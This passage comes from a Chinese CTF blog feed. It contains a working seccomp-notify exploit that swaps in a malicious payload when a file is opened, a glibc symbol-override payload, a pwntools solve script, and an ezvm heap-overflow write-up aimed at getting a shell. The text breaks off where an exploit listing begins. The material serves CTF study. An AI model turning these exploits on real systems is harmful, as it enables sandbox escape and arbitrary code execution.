errExit(<span class="hljs-string">&quot;close-target-notify-fd&quot;</span>);<br><br>  closeSocketPair(sockPair);<br><br>  <span class="hljs-comment">/* Perform a mkdir() call for each of the command-line arguments */</span><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Executing child&quot;</span>);<br>  sleep(<span class="hljs-number">1</span>);<br>  <span class="hljs-type">char</span> *f = <span class="hljs-literal">NULL</span>;<br>  execve(<span class="hljs-string">&quot;/home/pwn/readme&quot;</span>, &amp;f, &amp;f);<br>  <span class="hljs-comment">// openat(AT_FDCWD,&quot;/bin/bash&quot;,0);</span><br>  <span class="hljs-built_in">exit</span>(EXIT_SUCCESS);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">allocSeccompNotifBuffers</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> seccomp_notif **req,</span><br><span class="hljs-params">                                     <span class="hljs-keyword">struct</span> seccomp_notif_resp **resp,</span><br><span class="hljs-params">                                     <span class="hljs-keyword">struct</span> seccomp_notif_sizes *sizes)</span> &#123;<br>  <span class="hljs-keyword">if</span> (seccomp(SECCOMP_GET_NOTIF_SIZES, <span class="hljs-number">0</span>, sizes) == <span class="hljs-number">-1</span>)<br>    errExit(<span class="hljs-string">&quot;seccomp-SECCOMP_GET_NOTIF_SIZES&quot;</span>);<br><br>  *req = <span class="hljs-built_in">malloc</span>(sizes-&gt;seccomp_notif);<br>  <span class="hljs-keyword">if</span> (*req == <span class="hljs-literal">NULL</span>) errExit(<span class="hljs-string">&quot;malloc-seccomp_notif&quot;</span>);<br><br>  <span class="hljs-type">size_t</span> resp_size = sizes-&gt;seccomp_notif_resp;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> seccomp_notif_resp) &gt; resp_size)<br>    resp_size = <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> seccomp_notif_resp);<br><br>  *resp = <span class="hljs-built_in">malloc</span>(resp_size);<br>  <span class="hljs-keyword">if</span> (resp == <span class="hljs-literal">NULL</span>) errExit(<span class="hljs-string">&quot;malloc-seccomp_notif_resp&quot;</span>);<br>&#125;<br><br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">handleNotifications</span><span class="hljs-params">(<span class="hljs-type">int</span> notifyFd)</span> &#123;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seccomp_notif_sizes</span> <span class="hljs-title">sizes</span>;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seccomp_notif</span> *<span class="hljs-title">req</span>;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seccomp_notif_resp</span> *<span class="hljs-title">resp</span>;</span><br>  <span class="hljs-type">char</span> path[PATH_MAX];<br><br>  allocSeccompNotifBuffers(&amp;req, &amp;resp, &amp;sizes);<br><br>  <span class="hljs-comment">/* Loop handling notifications */</span><br><br>  <span class="hljs-keyword">for</span> (;;) &#123;<br>    <span class="hljs-comment">/* Wait for next notification, returning info in &#x27;*req&#x27; */</span><br><br>    <span class="hljs-built_in">memset</span>(req, <span class="hljs-number">0</span>, sizes.seccomp_notif);<br>    <span class="hljs-keyword">if</span> (ioctl(notifyFd, SECCOMP_IOCTL_NOTIF_RECV, req) == <span class="hljs-number">-1</span>) &#123;<br>      <span class="hljs-keyword">if</span> (errno == EINTR) <span class="hljs-keyword">continue</span>;<br>      errExit(<span class="hljs-string">&quot;\tS: ioctl-SECCOMP_IOCTL_NOTIF_RECV&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (req-&gt;data.nr != __NR_openat) &#123;<br>      <span class="hljs-built_in">printf</span>(<br>          <span class="hljs-string">&quot;\tS: notification contained unexpected &quot;</span><br>          <span class="hljs-string">&quot;system call number; bye!!!\n&quot;</span>);<br>      <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seccomp_notif_addfd</span> <span class="hljs-title">addfd</span>;</span><br>    addfd.id = req-&gt;id; <span class="hljs-comment">/* Cookie from SECCOMP_IOCTL_NOTIF_RECV */</span><br>    addfd.srcfd = openat(req-&gt;data.args[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;/tmp/payload&quot;</span>, req-&gt;data.args[<span class="hljs-number">2</span>],req-&gt;data.args[<span class="hljs-number">3</span>]);<br>    addfd.newfd = <span class="hljs-number">3</span>;<br>    addfd.flags = SECCOMP_ADDFD_FLAG_SETFD;<br>    addfd.newfd_flags = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> a2 = ioctl(notifyFd, SECCOMP_IOCTL_NOTIF_ADDFD, &amp;addfd);<br><br>    resp-&gt;id = req-&gt;id;<br>    resp-&gt;flags = <span class="hljs-number">0</span>;<br>    resp-&gt;val = <span class="hljs-number">0</span>;<br>    resp-&gt;error = resp-&gt;val = <span class="hljs-number">0</span>;<br>    resp-&gt;val = a2;<br><br>    resp-&gt;flags = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">if</span> (ioctl(notifyFd, SECCOMP_IOCTL_NOTIF_SEND, resp) == <span class="hljs-number">-1</span>) &#123;<br>      <span class="hljs-keyword">if</span> (errno == ENOENT)<br>        <span class="hljs-built_in">printf</span>(<br>            <span class="hljs-string">&quot;\tS: response failed with ENOENT; &quot;</span><br>            <span class="hljs-string">&quot;perhaps target process&#x27;s syscall was &quot;</span><br>            <span class="hljs-string">&quot;interrupted by a signal?\n&quot;</span>);<br>      <span class="hljs-keyword">else</span><br>        perror(<span class="hljs-string">&quot;ioctl-SECCOMP_IOCTL_NOTIF_SEND&quot;</span>);<br>    &#125;<br>  &#125;<br><br>  <span class="hljs-built_in">free</span>(req);<br>  <span class="hljs-built_in">free</span>(resp);<br>  <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-comment">/* Implementation of the supervisor process:</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">  (1) obtains the notification file descriptor from &#x27;sockPair[1]&#x27;</span><br><span class="hljs-comment">  (2) handles notifications that arrive on that file descriptor. */</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">supervisor</span><span class="hljs-params">(<span class="hljs-type">int</span> sockPair[<span class="hljs-number">2</span>])</span> &#123;<br>  <span class="hljs-type">int</span> notifyFd = recvfd(sockPair[<span class="hljs-number">1</span>]);<br>  <span class="hljs-keyword">if</span> (notifyFd == <span class="hljs-number">-1</span>) errExit(<span class="hljs-string">&quot;recvfd&quot;</span>);<br><br>  closeSocketPair(sockPair); <span class="hljs-comment">/* We no longer need the socket pair */</span><br><br>  handleNotifications(notifyFd);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">readBinary</span><span class="hljs-params">()</span>&#123;<br>  <span class="hljs-type">int</span> sz,readed;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;size:&quot;</span>);<br>  <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;sz);<br>  <span class="hljs-type">char</span> *buf = <span class="hljs-built_in">malloc</span>(sz);<br><br>  <span class="hljs-type">int</span> f = open(<span class="hljs-string">&quot;/tmp/payload&quot;</span>,O_WRONLY|O_CREAT,<span class="hljs-number">0777</span>);<br>  <span class="hljs-keyword">while</span>(sz &gt; <span class="hljs-number">0</span>)&#123;<br>    readed = read(<span class="hljs-number">0</span>,buf,sz);<br>    write(f,buf,readed);<br>    sz -= readed;<br>  &#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> *argv[])</span> &#123;<br>  <span class="hljs-type">int</span> sockPair[<span class="hljs-number">2</span>];<br><br>  setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>);<br>  readBinary();<br>  <span class="hljs-keyword">if</span> (socketpair(AF_UNIX, SOCK_STREAM, <span class="hljs-number">0</span>, sockPair) == <span class="hljs-number">-1</span>)<br>    errExit(<span class="hljs-string">&quot;socketpair&quot;</span>);<br><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sigaction</span> <span class="hljs-title">sa</span>;</span><br>  sa.sa_handler = sigchldHandler;<br>  sa.sa_flags = <span class="hljs-number">0</span>;<br>  sigemptyset(&amp;sa.sa_mask);<br>  <span class="hljs-keyword">if</span> (sigaction(SIGCHLD, &amp;sa, <span class="hljs-literal">NULL</span>) == <span class="hljs-number">-1</span>) errExit(<span class="hljs-string">&quot;sigaction&quot;</span>);<br>  targetProcess(sockPair, &amp;argv[optind]);<br><br>  supervisor(sockPair);<br><br>  <span class="hljs-built_in">exit</span>(EXIT_SUCCESS);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// payload.c</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;asm/unistd.h&gt;</span></span><br><br>__asm__(<span class="hljs-string">&quot;.symver __libc_start_main_impl,__libc_start_main@GLIBC_2.34&quot;</span>);<br>__asm__(<span class="hljs-string">&quot;.symver __libc_start_main_impl,__libc_start_main@GLIBC_2.2.5&quot;</span>);<br>__asm__(<span class="hljs-string">&quot;.symver puts_impl,puts@GLIBC_2.2.5&quot;</span>);<br><br><br><span class="hljs-type">void</span> __libc_start_main_impl()&#123;<br>    <span class="hljs-keyword">asm</span>(<span class="hljs-string">&quot;.intel_syntax noprefix&quot;</span>);<br>    <span class="hljs-keyword">asm</span>(<span class="hljs-string">&quot;mov rax,1&quot;</span>);<br>    <span class="hljs-keyword">asm</span>(<span class="hljs-string">&quot;mov rsi,rdi&quot;</span>);<br>    <span class="hljs-keyword">asm</span>(<span class="hljs-string">&quot;mov rdi,1&quot;</span>);<br>    <span class="hljs-keyword">asm</span>(<span class="hljs-string">&quot;mov rdx,0x1000&quot;</span>);<br>    <span class="hljs-keyword">asm</span>(<span class="hljs-string">&quot;syscall&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">puts_impl</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-keyword">asm</span>(<span class="hljs-string">&quot;.intel_syntax noprefix&quot;</span>);<br>    <span class="hljs-keyword">asm</span>(<span class="hljs-string">&quot;mov rax,1&quot;</span>);<br>    <span class="hljs-keyword">asm</span>(<span class="hljs-string">&quot;mov qword ptr [rax],1&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment"># solve.py</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> os<br><br>os.system(<span class="hljs-string">&#x27;gcc ./payload.c -shared -Wl,--version-script,payload.map -o ./payload&#x27;</span>)<br>os.system(<span class="hljs-string">&#x27;gcc ./exploit.c -o ./exploit&#x27;</span>)<br><br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./exploit&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>).read()<br>r = remote(<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>,<span class="hljs-number">9000</span>)<br>r.sendlineafter(<span class="hljs-string">&#x27;:&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(f)))<br>time.sleep(<span class="hljs-number">1</span>)<br>r.send(f)<br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./payload&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>).read()<br><br>r.sendlineafter(<span class="hljs-string">&#x27;:&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(f)))<br>time.sleep(<span class="hljs-number">1</span>)<br>r.send(f)<br><br>r.interactive()<br></code></pre></td></tr></table></figure><p>整体思想还是很简单的，通过 <code>SECCOMP_IOCTL_NOTIF_ADDFD</code> 去劫持 openat，返回我们的恶意 payload，实现类似 <code>LD_PROLOAD</code> 的效果。</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20221019165240559.png" alt="image-20221019165240559"></p><h2 id="jsy-5-solves-Working…"><a class="header-anchor" href="#jsy-5-solves-Working…">¶</a>jsy(5 solves)(Working…)</h2><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20221016122254774.png" alt="image-20221016122254774"></p><h2 id="参考链接"><a class="header-anchor" href="#参考链接">¶</a>参考链接</h2><h3 id="Readable"><a class="header-anchor" href="#Readable">¶</a>Readable</h3><ul><li><p><a href="https://github.com/justcatthefish/justctf-2022/tree/main/challenges/pwn_dumpme">JustCTF2022 - pwn_dumpme</a></p></li><li><p><a href="https://linux.die.net/man/8/ld.so">ld.so 文档 - man</a></p></li><li><p><a href="https://www.kernel.org/doc/Documentation/prctl/no_new_privs.txt">PR_SET_NO_NEW_PRIVS</a></p></li><li><p><a href="http://just4coding.com/2022/04/03/seccomp/">Seccomp机制与seccomp notify介绍 - Just For Coding</a></p></li><li><p><a href="https://brauner.github.io/2020/07/23/seccomp-notify.html">The Seccomp Notifier - New Frontiers in Unprivileged Container Development</a></p></li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>关于 Jail (Working...)</title>
    <link href="/posts/161033ee.html"/>
    <url>/posts/161033ee.html</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="再等等 XD" data-whm="Incorrect Password">  <script id="hbeData" type="hbeData" data-hmacdigest="ce7dc5ef5c7347a7546bbb554b194f4238220dda4d0e47b8f2644e9e32ef5887"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">总结例题中...</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>内核 UAF 漏洞的一般解法探寻 (Working...)</title>
    <link href="/posts/bb063645.html"/>
    <url>/posts/bb063645.html</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="再等等 XD" data-whm="Incorrect Password">  <script id="hbeData" type="hbeData" data-hmacdigest="56ffebe25d5fd766e6678b84683646d9e899b6e15cd3a9305ddd3f98615b11ec"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">还没有写自己的东西</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>2022 0CTF/TCTF 部分赛题解与复现</title>
    <link href="/posts/ca1d58fb.html"/>
    <url>/posts/ca1d58fb.html</url>
    
    <content type="html"><![CDATA[<p>glibc 小小做题家，什么时候才能和大师傅们一样审源码秒题呜呜呜 ( ᗜ ˰ ᗜ )</p><p>我在比赛中只做出了 BabyHeap 和 ezvm，其他题还在复现。</p><h2 id="babyheap2022（35-Solved）"><a class="header-anchor" href="#babyheap2022（35-Solved）">¶</a>babyheap2022（35 Solved）</h2><p>2.35 的堆溢出，洒洒水啦。</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220920122906462.png" alt="babyheap2022"></p><h3 id="题目描述"><a class="header-anchor" href="#题目描述">¶</a>题目描述</h3><p>Hooks are wiped.</p><p>Pointers are mangled.</p><p>Skills are to be replenished.</p><p><a href="https://drive.google.com/file/d/1iC36vnQ8DgE7dTV7jinWOU4SiG-W4mVp/view?usp=sharing">babyheap</a></p><p>Update: The file is updated to include the running environment.</p><h3 id="思路"><a class="header-anchor" href="#思路">¶</a>思路</h3><p>一次打 fskey，一次打 tls_dtor_list，比较简单，不放 exp 了=.=</p><p>可以看看 <a href="https://ctftime.org/event/1717/tasks/">ctftime</a> 上其他师傅写的。</p><h2 id="ezvm-29-Solved"><a class="header-anchor" href="#ezvm-29-Solved">¶</a>ezvm(29 Solved)</h2><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220920121121665.png" alt="ezvm"></p><h3 id="题目描述-v2"><a class="header-anchor" href="#题目描述-v2">¶</a>题目描述</h3><p>Enjoy a game with virtual machine!</p><p><a href="https://drive.google.com/file/d/1zJzZSx_fCxgTnOXwaDpsmtztBSohXkFU/view?usp=sharing">attachment</a></p><h3 id="题目分析"><a class="header-anchor" href="#题目分析">¶</a>题目分析</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">do_things</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> __int64 size; <span class="hljs-comment">// [rsp+8h] [rbp-28h]</span><br>  <span class="hljs-type">void</span> *a1; <span class="hljs-comment">// [rsp+10h] [rbp-20h]</span><br>  <span class="hljs-type">unsigned</span> __int64 a4; <span class="hljs-comment">// [rsp+18h] [rbp-18h]</span><br>  <span class="hljs-type">void</span> *a2; <span class="hljs-comment">// [rsp+28h] [rbp-8h]</span><br><br>  write_n(<span class="hljs-string">&quot;Please input your code size:&quot;</span>);<br>  size = try_LONG();<br>  <span class="hljs-keyword">if</span> ( size &gt;= <span class="hljs-number">0x200</span> )<br>    Error(<span class="hljs-string">&quot;too much!&quot;</span>);<br>  a1 = <span class="hljs-built_in">malloc</span>(size);<br>  <span class="hljs-keyword">if</span> ( !a1 )<br>    Error(<span class="hljs-string">&quot;malloc failed!&quot;</span>);<br>  write_n(<span class="hljs-string">&quot;Please input your memory count:&quot;</span>);<br>  a4 = try_LONG();<br>  <span class="hljs-keyword">if</span> ( a4 &gt;= <span class="hljs-number">0x200000000000000</span>LL )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( !only_chance )<br>      Error(<span class="hljs-string">&quot;bye bye! bad hacker!&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;OK, only one chance.&quot;</span>);<br>    only_chance = <span class="hljs-number">0</span>;<br>  &#125;<br>  a2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span> * a4);                          <span class="hljs-comment">// overflow</span><br>  <span class="hljs-keyword">if</span> ( !a2 )<br>    Error(<span class="hljs-string">&quot;malloc failed!&quot;</span>);<br>  write_n(<span class="hljs-string">&quot;Please input your code:&quot;</span>);<br>  read_n((__int64)a1, size);<br>  vm_init(a1, a2, size, a4);<br>  vm_run();<br>  vm_free();<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">vm_run</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> __int8 v1; <span class="hljs-comment">// [rsp+3h] [rbp-2Dh]</span><br>  <span class="hljs-type">unsigned</span> __int8 v2; <span class="hljs-comment">// [rsp+3h] [rbp-2Dh]</span><br>  <span class="hljs-type">unsigned</span> __int8 v3; <span class="hljs-comment">// [rsp+3h] [rbp-2Dh]</span><br>  <span class="hljs-type">unsigned</span> __int8 v4; <span class="hljs-comment">// [rsp+3h] [rbp-2Dh]</span><br>  <span class="hljs-type">unsigned</span> __int8 reg_id; <span class="hljs-comment">// [rsp+3h] [rbp-2Dh]</span><br>  <span class="hljs-type">int</span> v6; <span class="hljs-comment">// [rsp+4h] [rbp-2Ch]</span><br>  __int64 v7; <span class="hljs-comment">// [rsp+8h] [rbp-28h]</span><br>  __int64 mem_id; <span class="hljs-comment">// [rsp+8h] [rbp-28h]</span><br>  <span class="hljs-type">void</span> *v9; <span class="hljs-comment">// [rsp+18h] [rbp-18h]</span><br>  __int64 v10; <span class="hljs-comment">// [rsp+20h] [rbp-10h]</span><br>  __int64 v11; <span class="hljs-comment">// [rsp+20h] [rbp-10h]</span><br>  __int64 v12; <span class="hljs-comment">// [rsp+20h] [rbp-10h]</span><br><br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">2</span> )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( vm_ip &lt; Code_size )<br>    &#123;<br>      v6 = (<span class="hljs-type">char</span>)CODE[vm_ip++];<br>      <span class="hljs-keyword">switch</span> ( v6 )<br>      &#123;<br>...<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">20</span>:<br>          v3 = CODE[vm_ip];<br>          v9 = *(<span class="hljs-type">void</span> **)&amp;CODE[++vm_ip];<br>          vm_ip += <span class="hljs-number">8LL</span>;<br>          <span class="hljs-keyword">if</span> ( v3 &gt;= <span class="hljs-number">4u</span> )<br>            Error(<span class="hljs-string">&quot;oveflow!&quot;</span>);<br>          *(&amp;Memory_ptr_while_regs + (<span class="hljs-type">char</span>)v3 + <span class="hljs-number">4</span>) = v9;<br>          <span class="hljs-keyword">continue</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">21</span>:<br>          v4 = CODE[vm_ip];<br>          v7 = *(_QWORD *)&amp;CODE[++vm_ip];<br>          vm_ip += <span class="hljs-number">8LL</span>;<br>          <span class="hljs-keyword">if</span> ( v4 &gt; <span class="hljs-number">3u</span> || v7 &lt; <span class="hljs-number">0</span> || v7 &gt;= Memory_size )<br>            Error(<span class="hljs-string">&quot;oveflow!&quot;</span>);<br>          *((_QWORD *)Memory_ptr_while_regs + v7) = *(&amp;Memory_ptr_while_regs + (<span class="hljs-type">char</span>)v4 + <span class="hljs-number">4</span>);<br>          <span class="hljs-keyword">continue</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">22</span>:<br>          reg_id = CODE[vm_ip];<br>          mem_id = *(_QWORD *)&amp;CODE[++vm_ip];<br>          vm_ip += <span class="hljs-number">8LL</span>;<br>          <span class="hljs-keyword">if</span> ( reg_id &gt; <span class="hljs-number">3u</span> || mem_id &lt; <span class="hljs-number">0</span> || mem_id &gt;= <span class="hljs-number">8</span> * Memory_size / <span class="hljs-number">8</span> )<br>            Error(<span class="hljs-string">&quot;oveflow!&quot;</span>);<br>          *(&amp;Memory_ptr_while_regs + (<span class="hljs-type">char</span>)reg_id + <span class="hljs-number">4</span>) = (<span class="hljs-type">void</span> *)*((_QWORD *)Memory_ptr_while_regs + mem_id);<br>          <span class="hljs-keyword">continue</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">23</span>:<br>          <span class="hljs-keyword">return</span> write_n(<span class="hljs-string">&quot;finish!&quot;</span>);<br>        <span class="hljs-keyword">default</span>:<br>          write_n(<span class="hljs-string">&quot;what???&quot;</span>);<br>          <span class="hljs-keyword">continue</span>;<br>      &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> write_n(<span class="hljs-string">&quot;finish!&quot;</span>);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>实现了一个带堆玩的虚拟机，给了一次溢出机会</p><p>其他的功能比较正常，就是开辟的虚拟机寄存器和栈之间的一些加减乘除位运算比大小这些常规操作。</p><p>需要注意的问题：</p><ol><li>每次堆块申请的顺序是 CODE、Memory、Stack，释放顺序是 Memory、CODE、Stack，Stack 常规情况下都会与 Top Chunk 合并</li><li>溢出结合 <code>case 21</code> 可以造成堆上任意写。由于判断是 <code>mem_id &gt;= 8 * Memory_size / 8</code> ，想利用 <code>case 22</code> 越界读是不行的 =.=</li><li>如果申请的堆块大小溢出后大于 <code>0x200000</code>，则可以在 libc 上越界写</li></ol><h3 id="思路一-Master-of-Glibc（bushi）"><a class="header-anchor" href="#思路一-Master-of-Glibc（bushi）">¶</a>思路一 Master of Glibc（<s>bushi</s>）</h3><p>思路一是我比赛时的思路，，挺复杂的，而且慢。当时确实没想到什么奇奇怪怪的简单方法，就直接一股脑往下做了，堆风水调了很长时间qwq，没有想到走 mmap 分配到 libc 上面这样子。</p><ol><li>利用每次申请的 code size 不同，布置堆风水。利用一次溢出，同时布置几个size，确保 free 不会出错，并构造堆块重叠，同时布置好一个 Largebin 和一个 Unsortedbin。</li><li>堆块重叠后，读取 libc 地址和 heap 基址，通过寄存器入栈，栈里计算再出栈，寄存器送入 memory 一系列操作，修改 Largebin 的 bk 为 <code>_IO_list_all - 0x20</code>，然后布置好 IO 链子巴拉巴拉，最后 exit getshell</li></ol><h4 id="Exp"><a class="header-anchor" href="#Exp">¶</a>Exp</h4><p>交互部分是抄的大师傅的，整理了自己比赛时候的思路，稍微好看点。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span 